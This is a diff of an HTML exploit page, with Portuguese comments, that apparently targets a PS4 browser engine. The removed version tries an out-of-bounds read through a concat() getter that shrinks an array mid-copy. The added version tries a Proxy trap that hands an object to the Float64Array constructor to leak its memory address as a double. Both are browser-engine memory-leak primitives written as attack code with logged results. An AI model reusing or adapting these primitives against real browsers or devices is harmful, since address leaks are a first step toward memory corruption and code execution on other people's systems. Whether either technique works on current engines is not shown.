@@ -1,15 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Weaponized Concat Leak</title>
+    <title>Proxy Trap Type Confusion</title>
     <style>
         body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
-        #log { border: 1px solid #333; padding: 10px; }
-        .win { color: #0f0; font-weight: bold; font-size: 1.2em; }
+        #log { border: 1px solid #333; padding: 10px; min-height: 200px; }
+        .win { color: #0f0; font-weight: bold; font-size: 1.3em; border: 1px solid #0f0; padding: 5px; }
+        .fail { color: #555; }
     </style>
 </head>
 <body>
-    <h2>Concat Leak: Caçando Ponteiros</h2>
+    <h2>Proxy Trap: Tentando Confusão de Tipos</h2>
+    <p>Objetivo: Fazer o construtor tratar um Objeto como um Double.</p>
     <div id="log">Iniciando...</div>
 
     <script>
@@ -18,87 +20,89 @@
             el.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
         }
 
-        // Função auxiliar para converter Double (Float64) para Hex
+        // Conversor Float64 <-> BigInt64 (Hex)
         const buf = new ArrayBuffer(8);
         const f64 = new Float64Array(buf);
-        const u32 = new Uint32Array(buf);
+        const u64 = new BigUint64Array(buf);
 
-        function d2h(val) {
+        function f2h(val) {
             f64[0] = val;
-            let lo = u32[0];
-            let hi = u32[1];
-            return `0x${hi.toString(16).padStart(8,'0')}${lo.toString(16).padStart(8,'0')}`;
+            let hex = u64[0].toString(16);
+            return "0x" + hex.padStart(16, '0');
         }
+
+        // O Objeto que queremos vazar o endereço
+        // Pode ser qualquer coisa, mas um objeto com propriedades inline é bom
+        var targetObj = {a: 1, b: 2, c: 3, d: 4}; 
 
         function runExploit() {
             try {
-                log("1. Preparando Spray de Objetos...");
-                
-                // Criamos arrays de float para serem as "vítimas" adjacentes
-                // O header desses objetos contém ponteiros (StructureID / Butterfly)
-                let targets = [];
-                for(let i=0; i<100; i++) {
-                    targets.push([1.1, 2.2, 3.3, 4.4]);
-                }
+                log("1. Criando Proxy Malicioso...");
 
-                log("2. Configurando o Gatilho (Hole)...");
-                let hole = {
-                    length: 120, // Dizemos que vamos ler 120 itens
-                    [Symbol.isConcatSpreadable]: true,
-                    get 0() {
-                        // O GOLPE:
-                        // No momento da primeira leitura, esvaziamos o array alvo 'sprayer'
-                        // e forçamos o Garbage Collector para mover coisas.
-                        sprayer.length = 0; 
+                // Este array serve apenas para enganar o JIT/Alocador
+                const dummy = [1.1, 2.2, 3.3];
+
+                const proxy = new Proxy(dummy, {
+                    get(target, prop, receiver) {
+                        // Se o construtor pedir o tamanho, dizemos 2
+                        if (prop === "length") return 2;
                         
-                        // Opcional: Tentar forçar GC aqui se necessário
-                        // Mas o simples resize já deve expor a memória antiga
-                        return 1337.0; // Marcador
-                    },
-                    // Precisamos definir getters numéricos para enganar o motor se ele checar
-                    get 1() { return 1337.1; } 
-                };
+                        // O acesso ao índice 0 é normal
+                        if (prop === "0") return 1337.0;
 
-                // O Array que será esvaziado
-                // Colocamos valores float para alinhar com Doubles
-                let sprayer = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]; 
+                        // O GOLPE (Índice 1):
+                        // Quando ele pedir o segundo elemento, retornamos o OBJETO ALVO.
+                        // Um motor seguro daria erro ou converteria para NaN.
+                        // Um motor vulnerável grava o PONTEIRO.
+                        if (prop === "1") {
+                            log("   -> Trap ativado! Entregando Objeto em vez de Float...");
+                            return targetObj; 
+                        }
+
+                        return Reflect.get(target, prop, receiver);
+                    }
+                });
+
+                log("2. Disparando new Float64Array(proxy)...");
                 
-                log("3. Disparando concat()...");
+                // A mágica acontece aqui
+                const arr = new Float64Array(proxy);
+
+                log("3. Verificando resultados...");
                 
-                // A Mágica:
-                // sprayer (agora vazio) + hole (diz que tem 120) -> Leitura OOB
-                let res = sprayer.concat(hole);
+                // O índice 0 deve ser 1337
+                // O índice 1 deve ser NaN (seguro) ou um Ponteiro Gigante (VULNERÁVEL)
+                let val0 = arr[0];
+                let val1 = arr[1];
 
-                log("4. Analisando resultados...");
-                
-                // Procuramos por valores que NÃO sejam 1.1, 2.2... nem undefined
-                // E que pareçam ponteiros (valores gigantes ou específicos)
-                let foundLeak = false;
+                log(`   Index 0: ${val0}`);
+                log(`   Index 1: ${val1} (Hex: ${f2h(val1)})`);
 
-                for(let i=0; i<res.length; i++) {
-                    let val = res[i];
+                // Análise do Resultado
+                if (Number.isNaN(val1)) {
+                    log("[-] Falha: O objeto foi convertido para NaN corretamente.", 'fail');
+                } else if (val1 === 0) {
+                    log("[-] Falha: O objeto virou 0.", 'fail');
+                } else {
+                    // Se não é NaN e não é 0, e nós passamos um objeto...
+                    // É muito provável que seja um endereço de memória!
+                    let hex = f2h(val1);
                     
-                    if (val === undefined) continue;
-                    if (val === 1337.0 || val === 1337.1) continue; // Nossos marcadores
-                    if (val < 1000 && val > -1000) continue; // Números pequenos normais
-
-                    // Se chegou aqui, é algo estranho!
-                    let hex = d2h(val);
-                    
-                    // Filtro simples: Ponteiros em 64-bit userland geralmente começam com 0x0000
-                    // ou 0x0008 (comprimidos/estrutura).
-                    // Mas qualquer coisa que pareça um endereço é vitória.
-                    
-                    log(`[LEAK] Index ${i}: Valor Bruto=${val} | Hex=${hex}`, 'win');
-                    foundLeak = true;
-                }
-
-                if(!foundLeak) {
-                    log("Nenhum vazamento óbvio detectado nesta tentativa.");
+                    // Ponteiros de Userland no PS4 geralmente parecem com:
+                    // 0x00000008xxxxxxxx (Comprimido/Estrutura) ou 0x00007fxxxxxxxxxx
+                    if (hex.startsWith("0x0000")) {
+                        log(`[+] JACKPOT! ISSO PARECE UM PONTEIRO: ${hex}`, 'win');
+                        log("    Endereço do objeto vazado com sucesso!", 'win');
+                    } else {
+                        log(`[?] Resultado estranho: ${hex}. Pode ser um float comprimido?`, 'win');
+                    }
                 }
 
             } catch(e) {
-                log("Erro: " + e.message);
+                log("Erro Fatal: " + e.message);
+                if (e.message.includes("Cannot convert")) {
+                    log("[-] O motor bloqueou a conversão de Objeto para Número.", 'fail');
+                }
             }
         }
 
@@ -106,4 +110,3 @@
     </script>
 </body>
 </html>
-
